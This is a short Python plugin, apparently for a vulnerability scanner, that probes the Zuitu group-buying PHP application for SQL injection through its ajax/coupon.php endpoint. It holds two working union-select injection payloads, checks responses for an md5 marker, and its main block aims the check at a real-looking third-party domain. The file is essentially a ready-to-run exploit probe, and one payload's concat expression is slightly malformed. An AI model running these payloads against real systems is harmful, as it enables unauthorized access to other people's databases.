#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Auther__ = Tian.Te


def assign(service,arg):
    if service == "zuitu":
        return True, arg

def audit(arg):
    payloads = ("ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,md5(123),0x3amd5(123),0x3a,md5(123),md5(233)),8,9,10,11,9999999999,13,14,15,16%23",
                "ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,md5(123),0x3a,md5(123),0x3a,md5(123),0x3a),8,9,10,11,9999999999,13,14,15,16%23",    
                )
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode,finalurl =  curl.curl(url)
        if code == 200:
            if '202cb962ac59075b964b07152d234b70' in res:
                security_hole(url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('zuitu', 'http://colorstop.com.au/')[1])
